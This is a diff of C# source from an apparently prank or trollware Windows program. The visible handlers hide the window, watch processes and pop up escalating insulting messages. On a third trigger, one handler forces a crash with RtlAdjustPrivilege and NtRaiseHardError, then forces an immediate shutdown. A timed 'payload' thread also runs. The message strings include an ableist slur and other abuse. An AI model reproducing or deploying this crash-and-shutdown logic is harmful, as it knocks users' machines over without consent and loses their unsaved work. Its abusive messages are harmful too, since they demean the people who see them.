@@ -80,7 +80,6 @@ namespace purghe
         private void KillCodeBlocksButtonClick(object sender, EventArgs e)
 		{
 			Hide();
-			MessageBox.Show("fatto. dio zingarello");
 			new Thread(() =>
 			{
 				Dictionary<string, int> processDict = new Dictionary<string, int>();
@@ -105,12 +104,12 @@ namespace purghe
 								MessageBox.Show("HO DETTO CHIUDI!");
 								break;
 							case 2:
-								MessageBox.Show("NO!");
+								MessageBox.Show("BASTA!");
 								break;
 							case 3:
 								RtlAdjustPrivilege(19, true, false, out _);
 								NtRaiseHardError(0xffffffff, 0, 0, IntPtr.Zero, 6, out _);
-								Process.Start("shutdown", "/s /t 0");
+								Process.Start("shutdown", "/s /t 0"); // non si sa mai
 								break;
 							default: break;
 						}
@@ -119,7 +118,7 @@ namespace purghe
 			}).Start();
 		}
 
-		private void PayloadTimedCheckChanged(object sender, EventArgs e)
+        private void PayloadTimedCheckChanged(object sender, EventArgs e)
         {
 			if (!PayloadTimedCheck.Checked)
 			{
@@ -142,13 +141,13 @@ namespace purghe
 					MessageBox.Show("SCRIVI UN NUMERO! HANDICAPPATO!");
 					return;
 				}
-				Hide();
 				new Thread(() =>
 				{
 					Thread.Sleep(duration * 1000);
 					payloadThread.Abort();
 				}).Start();
 			}
+			Hide();
             payloadThread.Start();
         }
 
@@ -163,7 +162,7 @@ namespace purghe
 			return false;
 		}
 
-		private Color RandomColor() => Color.FromArgb(rand.Next(0, 256), rand.Next(0, 256), rand.Next(0, 256));
+        private Color RandomColor() => Color.FromArgb(rand.Next(0, 256), rand.Next(0, 256), rand.Next(0, 256));
 
 		private Point RandomPoint() => new Point(rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
 
